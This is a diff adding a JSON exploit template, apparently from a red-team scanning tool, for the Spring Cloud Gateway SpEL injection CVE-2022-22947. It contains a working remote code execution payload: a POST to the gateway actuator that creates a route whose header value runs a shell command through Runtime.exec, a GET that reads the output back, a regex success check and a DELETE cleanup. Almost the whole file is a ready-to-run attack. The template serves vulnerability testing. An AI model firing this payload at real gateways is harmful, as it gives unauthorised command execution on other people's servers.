@@ -1,0 +1,38 @@
+{
+  "name": "redteam/Spring Cloud Gateway SpEL RCE",
+  "description": "[god] CVE-2022-22947 — Spring Cloud Gateway actuator SpEL injection (NVD, spring.io advisory, vulhub): an AddResponseHeader route whose value is #{SpEL} executes at refresh; reading the route back echoes command output. Keywords: spring cloud gateway spel actuator rce cve-2022-22947 routes expression. ctrl: disabled/gateway actuator 404s the route -> not falsified. base_url = gateway root; check echoes uid=from the injected header; cleanup DELETEs the route.",
+  "cwe": "CWE-917",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/actuator/gateway/routes/pwn9f2",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"id\":\"pwn9f2\",\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"name\":\"X-R\",\"value\":\"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"sh\\\",\\\"-c\\\",\\\"id\\\"}).getInputStream()))}\"}}],\"uri\":\"http://example.com\"}"
+    },
+    "check": {
+      "method": "GET",
+      "url": "{{base_url}}/actuator/gateway/routes/pwn9f2"
+    },
+    "cleanup": {
+      "method": "DELETE",
+      "url": "{{base_url}}/actuator/gateway/routes/pwn9f2"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "check",
+      "pattern": "uid=\\d+\\("
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "628eb67c481b",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
